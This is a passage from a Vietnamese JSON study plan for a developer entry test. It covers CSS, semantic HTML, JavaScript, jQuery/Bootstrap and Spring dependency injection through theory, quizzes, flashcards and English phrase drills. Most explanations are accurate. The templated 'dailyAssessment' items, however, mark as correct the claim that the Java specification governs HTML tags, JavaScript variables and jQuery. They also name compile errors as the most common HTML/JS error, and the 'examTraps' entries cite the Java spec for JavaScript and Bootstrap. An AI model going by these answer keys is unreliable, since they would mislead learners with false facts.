              "q": "Liệt kê 4 lớp của CSS Box Model từ trong ra ngoài cùng.",
              "ans": "1) `Content` (Nội dung) -> 2) `Padding` (Đệm trong) -> 3) `Border` (Viền) -> 4) `Margin` (Lề ngoài)."
            }
          ]
        },
        {
          "level": "Level 2: Understanding",
          "desc": "box-sizing: border-box",
          "questions": [
            {
              "q": "Thuộc tính `box-sizing: border-box` giúp giải quyết vấn đề gì khi tính toán kích thước phần tử?",
              "ans": "Nó bao gồm cả `padding` và `border` vào trong chiều rộng (`width`) và chiều cao (`height`) đã khai báo, ngăn chặn phần tử bị phình to ra ngoài kích thước mong muốn khi thêm padding."
            }
          ]
        },
        {
          "level": "Level 3: Code Tracing",
          "desc": "Trace kích thước thực tế của phần tử CSS",
          "questions": [
            {
              "q": "Một phần tử có CSS: `width: 200px; padding: 20px; border: 5px solid black; box-sizing: content-box;`. Tổng chiều rộng thực tế hiển thị trên màn hình là bao nhiêu px?",
              "ans": "Tổng chiều rộng là: `250px`. Với `content-box`: Chiều rộng = width (200) + padding-left (20) + padding-right (20) + border-left (5) + border-right (5) = 250px."
            }
          ]
        },
        {
          "level": "Level 4: Exam Trap",
          "desc": "Bẫy Margin Collapse trong CSS",
          "questions": [
            {
              "q": "Khi hai khối xếp chồng nhau theo chiều dọc, khối trên có `margin-bottom: 30px;` và khối dưới có `margin-top: 20px;`, khoảng cách thực tế giữa hai khối là bao nhiêu?",
              "ans": "Khoảng cách thực tế là: `30px`! Hiện tượng Margin Collapse (gộp lề) làm cho lề dọc không cộng dồn mà lấy giá trị lớn nhất trong hai lề."
            }
          ]
        },
        {
          "level": "Level 5: Challenge",
          "desc": "Thẻ semantic HTML5 cho SEO",
          "questions": [
            {
              "q": "Tại sao nên dùng thẻ `<main>`, `<article>`, `<nav>`, `<header>` thay vì lạm dụng thẻ `<div>`?",
              "ans": "Cung cấp ý nghĩa cấu trúc ngữ nghĩa (semantic) cho trình đọc màn hình (accessibility) và bot tìm kiếm (SEO), giúp tối ưu hóa khả năng lập chỉ mục trang web."
            }
          ]
        }
      ],
      "dailyAssessment": [
        {
          "id": "da_36_1",
          "q": "Về mặt kỹ thuật, khẳng định nào sau đây là CHÍNH XÁC NHẤT về chuyên đề HTML Semantic tags (form, input, table, div, span)?",
          "options": [
            "Đặc tả Java quy định cú pháp và cơ chế của HTML Semantic tags (form, input, table, div, span) phải được kiểm tra chặt chẽ tại compile-time hoặc runtime",
            "Chỉ hoạt động được trên hệ điều hành Windows",
            "Không bao giờ xảy ra ngoại lệ khi thực thi",
            "Bị cấm sử dụng trong các dự án thực tế"
          ],
          "correct": 0,
          "exp": "Khẳng định 1 tuân thủ đúng chuẩn kiến trúc và đặc tả ngôn ngữ Java cho phần HTML Semantic tags (form, input, table, div, span)."
        },
        {
          "id": "da_36_2",
          "q": "Khi thao tác với HTML Semantic tags (form, input, table, div, span), lỗi nào phổ biến nhất?",
          "options": [
            "Lỗi cú pháp (Compile Error)",
            "NullPointerException",
            "ArrayIndexOutOfBoundsException",
            "StackOverflowError"
          ],
          "correct": 0,
          "exp": "Người học thường gặp lỗi biên dịch do không nắm chắc quy tắc định danh hoặc kiểu dữ liệu."
        }
      ],
      "dailyFlashcards": [
        {
          "q": "Thuộc tính `box-sizing: border-box` trong CSS có tác dụng gì?",
          "a": "Giúp tính toán kích thước phần tử chuẩn xác: chiều rộng (`width`) bao gồm toàn bộ phần nội dung (content) + padding + viền (border). Padding và border sẽ không làm nở to thêm chiều rộng ngoài mong muốn của phần tử.",
          "trap": "Mặc định `content-box` sẽ cộng dồn padding và border khiến layout bị tràn vỡ."
        }
      ],
      "dailyEnglish": [
        {
          "id": 27,
          "vi": "Tháng 2 không phải năm nhuận không có ngày 29, 30, 31",
          "en": "If the current year is non-leap year, February does not contain the day 29, 30, 31"
        },
        {
          "id": 28,
          "vi": "Bạn vui lòng nhập định dạng giờ không lớn hơn 24",
          "en": "Please input hour format without greater than 24"
        },
        {
          "id": 29,
          "vi": "Nếu trường thành phố và trường tên không rỗng thì tìm kiếm theo 2 điều kiện trên",
          "en": "If fields of city and name are not null, search by 2 above conditions"
        },
        {
          "id": 30,
          "vi": "Nếu trường thành phố, năm và tên  rỗng thì hiện tất cả các danh sách từ bảng Trainer.",
          "en": "If fields of city, year and name are null, show all lists from Trainer table"
        },
        {
          "id": 31,
          "vi": "Kiễm tra khi click nút xóa thì sẽ hiện lên bảng thông báo",
          "en": "Check if clicking button DELETE, show on NOTICE"
        }
      ]
    },
    "37": {
      "day": 37,
      "week": 6,
      "title": "Frontend Essentials: JavaScript Core",
      "topics": [
        "var vs let vs const (hoisting, block scope)",
        "Data types, primitive vs object",
        "DOM manipulation & Event Handling (addEventListener, event bubbling)",
        "AJAX & Fetch API basics, JSON parse/stringify",
        "Closure concept cơ bản"
      ],
      "tasks": [
        "Luyện trả lời phỏng vấn: JS chạy ở đâu? DOM là gì? AJAX dùng làm gì? let khác var thế nào?"
      ],
      "englishDrill": [
        {
          "id": 30,
          "vi": "Nếu trường thành phố, năm và tên  rỗng thì hiện tất cả các danh sách từ bảng Trainer.",
          "en": "If fields of city, year and name are null, show all lists from Trainer table"
        },
        {
          "id": 31,
          "vi": "Kiễm tra khi click nút xóa thì sẽ hiện lên bảng thông báo",
          "en": "Check if clicking button DELETE, show on NOTICE"
        },
        {
          "id": 32,
          "vi": "Set giá trị cho biến bị lỗi ở class không tìm thấy",
          "en": "Set values for undefined variables at invisible CLASS"
        },
        {
          "id": 33,
          "vi": "Định nghĩa form từ action",
          "en": "Define Form from ACTION"
        },
        {
          "id": 34,
          "vi": "Đặt giá trị cho biến",
          "en": "Assign values to variables"
        }
      ],
      "summary": "Frontend Essentials: JavaScript Core - var vs let/const, DOM, Event Bubbling, AJAX.",
      "coreTheory": "\n### 1. var vs let vs const (ES6)\n- `var`: Function scope, có Hoisting và khởi tạo `undefined`, cho phép khai báo lại.\n- `let`: Block scope `{}`, không cho phép tái khai báo, nằm trong TDZ (Temporal Dead Zone).\n- `const`: Block scope, bắt buộc gán giá trị ban đầu, không cho phép gán lại tham chiếu.\n\n### 2. DOM & Event Bubbling\n- DOM (Document Object Model): Cây đối tượng đại diện cho trang HTML.\n- Event Bubbling: Sự kiện kích hoạt ở thẻ con sẽ nổi bọt lan truyền dần lên các thẻ cha bao ngoài.\n\n### 3. AJAX (Asynchronous JavaScript and XML)\n- Cho phép gửi request ngầm lên server và cập nhật một phần trang web mà không cần tải lại toàn bộ trang.\n",
      "codeSnippet": "if (true) {\n    var a = 1;\n    let b = 2;\n}\nconsole.log(a); // 1 (lọt ra ngoài)\n// console.log(b); // ReferenceError: b is not defined (bị chặn trong block)",
      "traps": [
        "Khai báo `const obj = {}` vẫn có thể thay đổi thuộc tính `obj.name = 'test'`.",
        "var bị hoisting có thể gây lỗi logic biến nhận undefined."
      ],
      "quickQuiz": [
        {
          "q": "let khác var ở điểm căn bản nào?",
          "a": "let có block scope {}, var có function scope."
        }
      ],
      "estimatedTime": "3h 00m",
      "difficulty": "⭐⭐⭐",
      "priority": "🟡 MEDIUM (FEE & Audit Practice)",
      "source": "Sun Certified Programmer Study Guide (SCJP) & TestKing",
      "objectives": [
        "Nắm vững toàn diện lý thuyết chuyên sâu về: var vs let vs const (hoisting, block scope), Data types, primitive vs object, DOM manipulation & Event Handling (addEventListener, event bubbling).",
        "Luyện phản xạ bẫy đề thi và phân tích cơ chế JVM / Runtime.",
        "Hoàn thành các bài tập phân tích dòng chảy mã nguồn (Code Tracing) và kiểm tra đạt chuẩn."
      ],
      "whyMatters": "Chủ đề này xuất hiện thường xuyên trong đề thi Entry Test và các câu hỏi vấn đáp 1-1 Audit của FSOFT.",
      "prerequisites": "Kiến thức của các ngày học trước đó trong lộ trình.",
      "parts": [
        {
          "id": "part1",
          "title": "Part 1: Lý Thuyết Trọng Tâm & Nguyên Tắc Vàng",
          "sourceRef": "SCJP Objectives & Tài liệu nguồn",
          "theory": "\n### 1. var vs let vs const (ES6)\n- `var`: Function scope, có Hoisting và khởi tạo `undefined`, cho phép khai báo lại.\n- `let`: Block scope `{}`, không cho phép tái khai báo, nằm trong TDZ (Temporal Dead Zone).\n- `const`: Block scope, bắt buộc gán giá trị ban đầu, không cho phép gán lại tham chiếu.\n\n### 2. DOM & Event Bubbling\n- DOM (Document Object Model): Cây đối tượng đại diện cho trang HTML.\n- Event Bubbling: Sự kiện kích hoạt ở thẻ con sẽ nổi bọt lan truyền dần lên các thẻ cha bao ngoài.\n\n### 3. AJAX (Asynchronous JavaScript and XML)\n- Cho phép gửi request ngầm lên server và cập nhật một phần trang web mà không cần tải lại toàn bộ trang.\n",
          "code": "if (true) {\n    var a = 1;\n    let b = 2;\n}\nconsole.log(a); // 1 (lọt ra ngoài)\n// console.log(b); // ReferenceError: b is not defined (bị chặn trong block)"
        }
      ],
      "codeTracing": [
        {
          "id": "ct_37_1",
          "level": "Easy",
          "question": "let khác var ở điểm căn bản nào?",
          "code": "if (true) {\n    var a = 1;\n    let b = 2;\n}\nconsole.log(a); // 1 (lọt ra ngoài)\n// console.log(b); // ReferenceError: b is not defined (bị chặn trong block)",
          "options": [
            "Đúng theo dự đoán",
            "Compile Error",
            "Runtime Exception",
            "Khác"
          ],
          "correctIndex": 0,
          "explanation": "let có block scope {}, var có function scope."
        }
      ],
      "examTraps": [
        {
          "trap": "Cạm bẫy 1: Khai báo `const obj = {}` vẫn có thể thay đổi thuộc tính `obj.name = 'test'`.",
          "whyPeopleWrong": "Do thói quen lập trình hoặc nhầm lẫn giữa các quy tắc cú pháp.",
          "wrongThinking": "Áp dụng tư duy cảm tính thay vì bám sát đặc tả của Java.",
          "correctRule": "Luôn kiểm tra kiểu dữ liệu, phạm vi biến và tính hợp lệ trước khi thực thi.",
          "code": "if (true) {\n    var a = 1;\n    let b = 2;\n}\nconsole.log(a); // 1 (lọt ra ngoài)\n// console.log(b); // ReferenceError: b is not defined (bị chặn trong block)",
          "miniCheck": "Quy tắc cốt lõi: Nắm chắc đặc tả ngôn ngữ để tránh mất điểm."
        },
        {
          "trap": "Cạm bẫy 2: var bị hoisting có thể gây lỗi logic biến nhận undefined.",
          "whyPeopleWrong": "Do thói quen lập trình hoặc nhầm lẫn giữa các quy tắc cú pháp.",
          "wrongThinking": "Áp dụng tư duy cảm tính thay vì bám sát đặc tả của Java.",
          "correctRule": "Luôn kiểm tra kiểu dữ liệu, phạm vi biến và tính hợp lệ trước khi thực thi.",
          "code": "if (true) {\n    var a = 1;\n    let b = 2;\n}\nconsole.log(a); // 1 (lọt ra ngoài)\n// console.log(b); // ReferenceError: b is not defined (bị chặn trong block)",
          "miniCheck": "Quy tắc cốt lõi: Nắm chắc đặc tả ngôn ngữ để tránh mất điểm."
        }
      ],
      "practiceExercises": [
        {
          "level": "Level 1: Recall",
          "desc": "Phạm vi biến trong JavaScript",
          "questions": [
            {
              "q": "Phân biệt phạm vi (scope) của `var`, `let` và `const` trong JavaScript.",
              "ans": "`var` có phạm vi theo hàm (Function Scope). `let` và `const` có phạm vi theo khối lệnh (Block Scope `{}`). `const` cấm gán lại tham chiếu sau khi khởi tạo."
            }
          ]
        },
        {
          "level": "Level 2: Understanding",
          "desc": "Hoisting và Temporal Dead Zone (TDZ)",
          "questions": [
            {
              "q": "Temporal Dead Zone (TDZ) là gì khi khai báo biến bằng `let` và `const`?",
              "ans": "Biến `let` và `const` vẫn được hoisted nhưng không được khởi tạo giá trị mặc định. Vùng không gian từ đầu khối lệnh cho đến dòng thực tế khai báo biến được gọi là TDZ; truy cập biến trong vùng này sẽ ném lỗi `ReferenceError`."
            }
          ]
        },
        {
          "level": "Level 3: Code Tracing",
          "desc": "Trace Closure trong vòng lặp JavaScript",
          "questions": [
            {
              "q": "Cho đoạn code sau:\n```javascript\nfor (var i = 0; i < 3; i++) {\n    setTimeout(() => console.log(i), 0);\n}\n```\nKết quả in ra console là gì?",
              "ans": "In ra: `3, 3, 3`. Do biến `i` khai báo bằng `var` có function scope dùng chung cho cả vòng lặp. Khi các callback của `setTimeout` được lấy từ Task Queue ra thực thi, vòng lặp đã kết thúc và `i` đã bằng 3. (Nếu dùng `let`, mỗi lần lặp tạo 1 lexical scope riêng và in ra `0, 1, 2`)."
            }
          ]
        },
        {
          "level": "Level 4: Exam Trap",
          "desc": "Bẫy so sánh == vs === trong JS",
          "questions": [
            {
              "q": "Biểu thức `'0' == 0` và `'0' === 0` trong JavaScript trả về kết quả gì?",
              "ans": "`'0' == 0` trả về `true` (toán tử so sánh lỏng lẻo tự động ép kiểu chuỗi thành số). `'0' === 0` trả về `false` (toán tử so sánh nghiêm ngặt kiểm tra cả kiểu dữ liệu và giá trị)."
            }
          ]
        },
        {
          "level": "Level 5: Challenge",
          "desc": "Từ khóa this trong Arrow Function",
          "questions": [
            {
              "q": "Từ khóa `this` trong Arrow Function khác gì so với Regular Function thông thường?",
              "ans": "Arrow Function KHÔNG có ngữ cảnh `this` riêng! Nó kế thừa giá trị `this` từ phạm vi cha bao quanh tại thời điểm định nghĩa (Lexical `this`), và không thể bị thay đổi bởi `call()`, `apply()`, hay `bind()`."
            }
          ]
        }
      ],
      "dailyAssessment": [
        {
          "id": "da_37_1",
          "q": "Về mặt kỹ thuật, khẳng định nào sau đây là CHÍNH XÁC NHẤT về chuyên đề var vs let vs const (hoisting, block scope)?",
          "options": [
            "Đặc tả Java quy định cú pháp và cơ chế của var vs let vs const (hoisting, block scope) phải được kiểm tra chặt chẽ tại compile-time hoặc runtime",
            "Chỉ hoạt động được trên hệ điều hành Windows",
            "Không bao giờ xảy ra ngoại lệ khi thực thi",
            "Bị cấm sử dụng trong các dự án thực tế"
          ],
          "correct": 0,
          "exp": "Khẳng định 1 tuân thủ đúng chuẩn kiến trúc và đặc tả ngôn ngữ Java cho phần var vs let vs const (hoisting, block scope)."
        },
        {
          "id": "da_37_2",
          "q": "Khi thao tác với var vs let vs const (hoisting, block scope), lỗi nào phổ biến nhất?",
          "options": [
            "Lỗi cú pháp (Compile Error)",
            "NullPointerException",
            "ArrayIndexOutOfBoundsException",
            "StackOverflowError"
          ],
          "correct": 0,
          "exp": "Người học thường gặp lỗi biên dịch do không nắm chắc quy tắc định danh hoặc kiểu dữ liệu."
        }
      ],
      "dailyFlashcards": [
        {
          "q": "Sự khác biệt giữa `var`, `let`, và `const` trong JavaScript ES6?",
          "a": "- `var`: Có phạm vi hàm (function scope), bị Hoisting lên đầu với giá trị `undefined`.\n- `let`: Có phạm vi khối (block scope `{}`), nằm trong Temporal Dead Zone, không cho phép khai báo lại.\n- `const`: Giống let nhưng bắt buộc gán giá trị khởi tạo và không thể gán lại tham chiếu mới.",
          "trap": "Dùng const với object/array vẫn có thể thay đổi thuộc tính bên trong (`obj.name = 'abc'`)."
        }
      ],
      "dailyEnglish": [
        {
          "id": 30,
          "vi": "Nếu trường thành phố, năm và tên  rỗng thì hiện tất cả các danh sách từ bảng Trainer.",
          "en": "If fields of city, year and name are null, show all lists from Trainer table"
        },
        {
          "id": 31,
          "vi": "Kiễm tra khi click nút xóa thì sẽ hiện lên bảng thông báo",
          "en": "Check if clicking button DELETE, show on NOTICE"
        },
        {
          "id": 32,
          "vi": "Set giá trị cho biến bị lỗi ở class không tìm thấy",
          "en": "Set values for undefined variables at invisible CLASS"
        },
        {
          "id": 33,
          "vi": "Định nghĩa form từ action",
          "en": "Define Form from ACTION"
        },
        {
          "id": 34,
          "vi": "Đặt giá trị cho biến",
          "en": "Assign values to variables"
        }
      ]
    },
    "38": {
      "day": 38,
      "week": 6,
      "title": "Frontend Essentials: jQuery & Bootstrap",
      "topics": [
        "jQuery: $ selector, event methods (.click(), .change()), DOM traversal, .val(), .ajax()",
        "Bootstrap: Grid system (container, row, col-12, col-md-6), responsive breakpoints, components (modal, table, form)"
      ],
      "tasks": [
        "Hiểu nguyên lý lưới 12 cột Bootstrap",
        "Làm 10 câu flashcard FEE"
      ],
      "englishDrill": [
        {
          "id": 33,
          "vi": "Định nghĩa form từ action",
          "en": "Define Form from ACTION"
        },
        {
          "id": 34,
          "vi": "Đặt giá trị cho biến",
          "en": "Assign values to variables"
        },
        {
          "id": 35,
          "vi": "Khởi tạo đối tượng connection",
          "en": "Initialize connection object"
        },
        {
          "id": 36,
          "vi": "Câu truy vấn sql không thực hiện được",
          "en": "SQL  statement can not be executed"
        },
        {
          "id": 37,
          "vi": "Lấy danh sách theo điều kiện gán",
          "en": "Get list by assigning condition"
        }
      ],
      "summary": "Frontend Essentials: jQuery Selector & Bootstrap 12-Column Grid System.",
      "coreTheory": "\n### 1. jQuery Core\n- Cú pháp: `$(selector).action()`\n- Các phương thức phổ biến: `$('#id').val()`, `$('.class').text()`, `$('.btn').click()`, `$.ajax()`.\n\n### 2. Bootstrap Grid System\n- Hệ thống lưới gồm **12 cột**.\n- Cấu trúc chuẩn: `.container` $\\rightarrow$ `.row` $\\rightarrow$ `.col-*`.\n- Breakpoints: `col-` (mobile), `col-sm-` (tablet), `col-md-` (desktop nhỏ), `col-lg-` (desktop lớn).\n- Tổng số cột trên một hàng phải bằng 12 (ví dụ `.col-md-8` kết hợp `.col-md-4`).\n",
      "codeSnippet": "<div class=\"container\">\n    <div class=\"row\">\n        <div class=\"col-md-8\">Cột chiếm 8/12 phần</div>\n        <div class=\"col-md-4\">Cột chiếm 4/12 phần</div>\n    </div>\n</div>",
      "traps": [
        "Các class .col bắt buộc phải là con trực tiếp của .row.",
        "Không bao giờ viết code logic phức tạp trong jQuery, chỉ dùng cho DOM và AJAX đơn giản."
      ],
      "quickQuiz": [
        {
          "q": "Một hàng .row trong Bootstrap chia làm bao nhiêu cột?",
          "a": "12 cột."
        }
      ],
      "estimatedTime": "3h 00m",
      "difficulty": "⭐⭐⭐",
      "priority": "🟡 MEDIUM (FEE & Audit Practice)",
      "source": "Sun Certified Programmer Study Guide (SCJP) & TestKing",
      "objectives": [
        "Nắm vững toàn diện lý thuyết chuyên sâu về: jQuery: $ selector, event methods (.click(), .change()), DOM traversal, .val(), .ajax(), Bootstrap: Grid system (container, row, col-12, col-md-6), responsive breakpoints, components (modal, table, form).",
        "Luyện phản xạ bẫy đề thi và phân tích cơ chế JVM / Runtime.",
        "Hoàn thành các bài tập phân tích dòng chảy mã nguồn (Code Tracing) và kiểm tra đạt chuẩn."
      ],
      "whyMatters": "Chủ đề này xuất hiện thường xuyên trong đề thi Entry Test và các câu hỏi vấn đáp 1-1 Audit của FSOFT.",
      "prerequisites": "Kiến thức của các ngày học trước đó trong lộ trình.",
      "parts": [
        {
          "id": "part1",
          "title": "Part 1: Lý Thuyết Trọng Tâm & Nguyên Tắc Vàng",
          "sourceRef": "SCJP Objectives & Tài liệu nguồn",
          "theory": "\n### 1. jQuery Core\n- Cú pháp: `$(selector).action()`\n- Các phương thức phổ biến: `$('#id').val()`, `$('.class').text()`, `$('.btn').click()`, `$.ajax()`.\n\n### 2. Bootstrap Grid System\n- Hệ thống lưới gồm **12 cột**.\n- Cấu trúc chuẩn: `.container` $\\rightarrow$ `.row` $\\rightarrow$ `.col-*`.\n- Breakpoints: `col-` (mobile), `col-sm-` (tablet), `col-md-` (desktop nhỏ), `col-lg-` (desktop lớn).\n- Tổng số cột trên một hàng phải bằng 12 (ví dụ `.col-md-8` kết hợp `.col-md-4`).\n",
          "code": "<div class=\"container\">\n    <div class=\"row\">\n        <div class=\"col-md-8\">Cột chiếm 8/12 phần</div>\n        <div class=\"col-md-4\">Cột chiếm 4/12 phần</div>\n    </div>\n</div>"
        }
      ],
      "codeTracing": [
        {
          "id": "ct_d38_1",
          "level": "Easy",
          "question": "Trong Bootstrap Grid, một hàng `.row` được chia thành bao nhiêu cột chuẩn?",
          "code": "<div class=\"container\">\n  <div class=\"row\">\n    <div class=\"col-md-4\">A</div>\n    <div class=\"col-md-8\">B</div>\n  </div>\n</div>",
          "options": [
            "12 cột (4 + 8 = 12 chiếm trọn vẹn 1 hàng)",
            "10 cột",
            "16 cột",
            "24 cột"
          ],
          "correctIndex": 0,
          "explanation": "Hệ thống lưới (Grid System) của Bootstrap chia màn hình thành 12 cột. Ở đây `col-md-4` chiếm 4/12 (1/3 độ rộng) và `col-md-8` chiếm 8/12 (2/3 độ rộng), cộng lại vừa đủ 12 cột tạo nên một hàng hoàn chỉnh."
        }
      ],
      "examTraps": [
        {
          "trap": "Cạm bẫy 1: Các class .col bắt buộc phải là con trực tiếp của .row.",
          "whyPeopleWrong": "Do thói quen lập trình hoặc nhầm lẫn giữa các quy tắc cú pháp.",
          "wrongThinking": "Áp dụng tư duy cảm tính thay vì bám sát đặc tả của Java.",
          "correctRule": "Luôn kiểm tra kiểu dữ liệu, phạm vi biến và tính hợp lệ trước khi thực thi.",
          "code": "<div class=\"container\">\n    <div class=\"row\">\n        <div class=\"col-md-8\">Cột chiếm 8/12 phần</div>\n        <div class=\"col-md-4\">Cột chiếm 4/12 phần</div>\n    </div>\n</div>",
          "miniCheck": "Quy tắc cốt lõi: Nắm chắc đặc tả ngôn ngữ để tránh mất điểm."
        },
        {
          "trap": "Cạm bẫy 2: Không bao giờ viết code logic phức tạp trong jQuery, chỉ dùng cho DOM và AJAX đơn giản.",
          "whyPeopleWrong": "Do thói quen lập trình hoặc nhầm lẫn giữa các quy tắc cú pháp.",
          "wrongThinking": "Áp dụng tư duy cảm tính thay vì bám sát đặc tả của Java.",
          "correctRule": "Luôn kiểm tra kiểu dữ liệu, phạm vi biến và tính hợp lệ trước khi thực thi.",
          "code": "<div class=\"container\">\n    <div class=\"row\">\n        <div class=\"col-md-8\">Cột chiếm 8/12 phần</div>\n        <div class=\"col-md-4\">Cột chiếm 4/12 phần</div>\n    </div>\n</div>",
          "miniCheck": "Quy tắc cốt lõi: Nắm chắc đặc tả ngôn ngữ để tránh mất điểm."
        }
      ],
      "practiceExercises": [
        {
          "level": "Level 1: Recall",
          "desc": "Hệ thống lưới Bootstrap",
          "questions": [
            {
              "q": "Hệ thống Grid của Bootstrap 5 chia một hàng (`.row`) thành bao nhiêu cột ảo?",
              "ans": "Được chia thành chính xác `12 cột`."
            }
          ]
        },
        {
          "level": "Level 2: Understanding",
          "desc": "Breakpoints trong Responsive Design",
          "questions": [
            {
              "q": "Các tiền tố breakpoint chuẩn của Bootstrap: `sm`, `md`, `lg`, `xl` áp dụng theo nguyên tắc Mobile-first như thế nào?",
              "ans": "Bootstrap áp dụng Mobile-first với `min-width`: Các style khai báo cho `col-md-6` sẽ áp dụng từ màn hình kích thước medium (>= 768px) trở lên, trừ khi bị ghi đè bởi breakpoint lớn hơn (ví dụ `col-lg-4`)."
            }
          ]
        },
        {
          "level": "Level 3: Code Tracing",
          "desc": "Trace căn chỉnh Flexbox",
          "questions": [
            {
              "q": "Cho đoạn CSS:\n```css\n.container {\n    display: flex;\n    justify-content: center;\n    align-items: center;\n}\n```\nCác phần tử con bên trong container sẽ được căn chỉnh như thế nào?",
              "ans": "Được căn chính giữa cả theo trục chính ngang (Horizontal center qua `justify-content`) và trục phụ dọc (Vertical center qua `align-items`)."
            }
          ]
        },
        {
          "level": "Level 4: Exam Trap",
          "desc": "Bẫy lồng hàng và cột trong Bootstrap",
          "questions": [
            {
              "q": "Trong Bootstrap, phần tử con trực tiếp của một thẻ có class `.row` BẮT BUỘC phải là gì?",
              "ans": "Bắt buộc phải là các cột (`.col` hoặc `.col-*`). Không được đặt nội dung trực tiếp vào `.row` mà không qua `.col` vì sẽ làm hỏng hệ thống lề âm (negative margins) của Bootstrap."
            }
          ]
        },
        {
          "level": "Level 5: Challenge",
          "desc": "Media Queries thuần",
          "questions": [
            {
              "q": "Viết cú pháp media query CSS thuần để đổi màu nền thành đen khi chiều rộng màn hình tối đa là 768px.",
              "ans": "`@media (max-width: 768px) { body { background-color: black; } }`"
            }
          ]
        }
      ],
      "dailyAssessment": [
        {
          "id": "da_38_1",
          "q": "Về mặt kỹ thuật, khẳng định nào sau đây là CHÍNH XÁC NHẤT về chuyên đề jQuery: $ selector, event methods (.click(), .change()), DOM traversal, .val(), .ajax()?",
          "options": [
            "Đặc tả Java quy định cú pháp và cơ chế của jQuery: $ selector, event methods (.click(), .change()), DOM traversal, .val(), .ajax() phải được kiểm tra chặt chẽ tại compile-time hoặc runtime",
            "Chỉ hoạt động được trên hệ điều hành Windows",
            "Không bao giờ xảy ra ngoại lệ khi thực thi",
            "Bị cấm sử dụng trong các dự án thực tế"
          ],
          "correct": 0,
          "exp": "Khẳng định 1 tuân thủ đúng chuẩn kiến trúc và đặc tả ngôn ngữ Java cho phần jQuery: $ selector, event methods (.click(), .change()), DOM traversal, .val(), .ajax()."
        },
        {
          "id": "da_38_2",
          "q": "Khi thao tác với jQuery: $ selector, event methods (.click(), .change()), DOM traversal, .val(), .ajax(), lỗi nào phổ biến nhất?",
          "options": [
            "Lỗi cú pháp (Compile Error)",
            "NullPointerException",
            "ArrayIndexOutOfBoundsException",
            "StackOverflowError"
          ],
          "correct": 0,
          "exp": "Người học thường gặp lỗi biên dịch do không nắm chắc quy tắc định danh hoặc kiểu dữ liệu."
        }
      ],
      "dailyFlashcards": [
        {
          "q": "Hệ thống lưới (Grid System) 12 cột của Bootstrap hoạt động theo nguyên tắc nào?",
          "a": "Mỗi hàng được bọc trong một thẻ `.row`, và tổng số cột (`col-*`) của các phần tử con trực tiếp trong 1 hàng luôn cộng lại tối đa là 12. Nếu vượt quá 12, phần tử thừa sẽ tự động rớt xuống dòng tiếp theo.",
          "trap": "Phải luôn đặt `.col-*` trực tiếp bên trong `.row`, không đặt margin ngang tùy tiện lên row."
        }
      ],
      "dailyEnglish": [
        {
          "id": 33,
          "vi": "Định nghĩa form từ action",
          "en": "Define Form from ACTION"
        },
        {
          "id": 34,
          "vi": "Đặt giá trị cho biến",
          "en": "Assign values to variables"
        },
        {
          "id": 35,
          "vi": "Khởi tạo đối tượng connection",
          "en": "Initialize connection object"
        },
        {
          "id": 36,
          "vi": "Câu truy vấn sql không thực hiện được",
          "en": "SQL  statement can not be executed"
        },
        {
          "id": 37,
          "vi": "Lấy danh sách theo điều kiện gán",
          "en": "Get list by assigning condition"
        }
      ]
    },
    "39": {
      "day": 39,
      "week": 6,
      "title": "Spring Framework: IoC, DI & Bean Lifecycle",
      "topics": [
        "Inversion of Control (IoC) & Dependency Injection (DI) là gì?",
        "Spring ApplicationContext & BeanFactory",
        "Spring Bean Scopes (singleton, prototype)",
        "@Component, @Service, @Repository, @Controller, @RestController",
        "@Autowired (field, setter, constructor injection)"
      ],
      "tasks": [
        "Tập giải thích IoC/DI bằng lời kèm ví dụ thực tế",
        "Vì sao Constructor Injection được khuyến nghị hơn Field Injection?"
      ],
      "englishDrill": [
        {
          "id": 36,
          "vi": "Câu truy vấn sql không thực hiện được",
          "en": "SQL  statement can not be executed"
        },
        {
          "id": 37,
          "vi": "Lấy danh sách theo điều kiện gán",
          "en": "Get list by assigning condition"
        },
        {
          "id": 38,
          "vi": "Set giá trị cho biến từ danh sách được lấy từ db",
          "en": "Assign values to variabes from list in database"
        },
        {
          "id": 39,
          "vi": "Kiểm tra nêu dữ liệu lấy là là rỗng thì sẽ export hết tất cả danh sách, ngược lại thì sẽ export theo dữ liệu được lấy về",
          "en": "Check if taken data is null, export all list, else, export by data"
        },
        {
          "id": 40,
          "vi": "Lấy dữ liệu về và kiểm tra nếu loại là C thì sẽ vào cập nhật và nếu là D thì sẽ là xóa, còn lại sẽ báo lỗi",
          "en": "if value of ... is D, delete, else C, update"
        }
      ],
      "summary": "Spring Framework Core: Inversion of Control (IoC), Dependency Injection (DI) & Bean Scopes.",
      "coreTheory": "\n### 1. IoC (Inversion of Control) & DI (Dependency Injection)\n- **IoC (Đảo ngược điều khiển):** Thay vì code tự `new` đối tượng, quyền tạo và quản lý vòng đời đối tượng được giao cho Spring Container.\n- **DI (Tiêm phụ thuộc):** Spring Container tự động tiêm đối tượng phụ thuộc vào class thông qua:\n  1. Constructor Injection (Được khuyến nghị nhất).\n  2. Setter Injection.\n  3. Field Injection (`@Autowired` trên biến).\n\n### 2. Spring Stereotypes\n- `@Component`: Đánh dấu class là Spring Bean nói chung.\n- `@Service`: Đánh dấu lớp Business Logic.\n- `@Repository`: Đánh dấu lớp DAO truy xuất dữ liệu, tự chuyển đổi exception SQL.\n- `@Controller` / `@RestController`: Đánh dấu Web Controller.\n\n### 3. Bean Scopes\n- `singleton` (Mặc định): Duy nhất 1 instance trong toàn bộ Container.\n- `prototype`: Mỗi lần gọi `getBean()` hoặc inject sẽ tạo một instance mới.\n",
      "codeSnippet": "@Service\npublic class UserService {\n    private final UserDAO userDAO;\n    \n    @Autowired // Constructor Injection\n    public UserService(UserDAO userDAO) {\n        this.userDAO = userDAO;\n    }\n}",
      "traps": [
        "Constructor Injection an toàn hơn Field Injection vì hỗ trợ immutability (final) và dễ viết Unit Test.",
        "Bean singleton có trạng thái thay đổi dễ gặp lỗi race-condition đa luồng."
      ],
      "quickQuiz": [
        {
          "q": "Scope mặc định của một Spring Bean là gì?",
          "a": "singleton"
        }
      ],
      "estimatedTime": "3h 00m",
      "difficulty": "⭐⭐⭐",
      "priority": "🟡 MEDIUM (FEE & Audit Practice)",
      "source": "Sun Certified Programmer Study Guide (SCJP) & TestKing",
      "objectives": [
        "Nắm vững toàn diện lý thuyết chuyên sâu về: Inversion of Control (IoC) & Dependency Injection (DI) là gì?, Spring ApplicationContext & BeanFactory, Spring Bean Scopes (singleton, prototype).",
        "Luyện phản xạ bẫy đề thi và phân tích cơ chế JVM / Runtime.",
        "Hoàn thành các bài tập phân tích dòng chảy mã nguồn (Code Tracing) và kiểm tra đạt chuẩn."
      ],
